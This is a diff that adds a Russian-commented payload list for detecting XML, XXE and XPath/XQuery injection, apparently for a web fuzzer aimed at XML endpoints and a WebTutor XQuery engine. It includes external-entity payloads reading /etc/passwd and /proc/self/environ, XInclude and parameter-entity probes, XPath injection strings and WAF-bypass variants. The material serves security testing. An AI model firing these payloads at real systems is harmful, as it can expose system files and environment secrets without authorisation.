@@ -1,0 +1,49 @@
+# XML / XQuery инъекции — детект по ошибкам парсера и обработке сущностей.
+# Деструктива и OOB-эксфильтрации нет: цель — установить ФАКТ разбора XML и
+# обработки DOCTYPE/внешних сущностей. Подтверждать вручную.
+# Актуально для эндпоинтов, принимающих XML, и для XQuery-движка WebTutor.
+#
+# --- битый XML -> ошибка парсера ---
+<foo>WSMARK
+<foo><bar></foo>
+<?xml version="1.0"?><root>WSMARK
+]]>WSMARK
+<!--WSMARK
+# --- внутренняя сущность (безопасно) ---
+<?xml version="1.0"?><!DOCTYPE r [<!ENTITY e "WSMARK">]><r>&e;</r>
+# --- объявление DOCTYPE: проверка, запрещён ли он (DOCTYPE is not allowed) ---
+<?xml version="1.0"?><!DOCTYPE r [<!ELEMENT r ANY>]><r>WSMARK</r>
+# --- внешняя сущность на локальный безобидный файл (детект XXE, Linux) ---
+<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/hostname">]><r>&x;</r>
+<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>
+<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///proc/self/environ">]><r>&x;</r>
+# --- параметрическая сущность (часто даёт отличимую ошибку) ---
+<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % p SYSTEM "file:///nonexistent">%p;]><r/>
+# --- XInclude (когда DOCTYPE вырезан, но парсер поддерживает XInclude) ---
+<r xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///nonexistent"/></r>
+# --- XPath / XQuery инъекция в значении ---
+' or '1'='1
+'] | //user/* | //*['
+WSMARK' and count(/*)=1 and 'a'='a
+" or ""="
+
+# ============================================================
+# Обфусцированные / WAF-bypass варианты (XML/XXE, статические).
+# Доп. кодировки на лету: 03_fuzzer.py --categories xml --mutations
+# ============================================================
+# смена объявленной кодировки (WAF парсит как UTF-8, парсер приложения — иначе)
+<?xml version="1.0" encoding="UTF-16"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>
+<?xml version="1.0" encoding="UTF-7"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/hostname">]><r>&x;</r>
+# значащие символы в числовых XML-сущностях
+<?xml version="1.0"?>&#60;!DOCTYPE r&#62;<r>WSMARK</r>
+# DOCTYPE в разном регистре / с пробелами
+<?xml version="1.0"?><!dOcTyPe r [<!ENTITY x SYSTEM "file:///etc/hostname">]><r>&x;</r>
+<?xml version="1.0"?><!DOCTYPE  r  [ <!ENTITY  x  SYSTEM  "file:///etc/hostname"> ]><r>&x;</r>
+# параметрическая сущность с внешним DTD (обход фильтров на inline-ENTITY)
+<?xml version="1.0"?><!DOCTYPE r SYSTEM "http://127.0.0.1/nonexistent.dtd"><r>WSMARK</r>
+# XInclude (когда вырезают DOCTYPE, но XInclude включён)
+<r xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/hostname"/></r>
+# CDATA вокруг инъекции в значение
+<r><![CDATA[' or '1'='1]]></r>
+# вложенная/битая сущность для ошибки парсера
+<?xml version="1.0"?><!DOCTYPE r [<!ENTITY a "&a;">]><r>&a;</r>
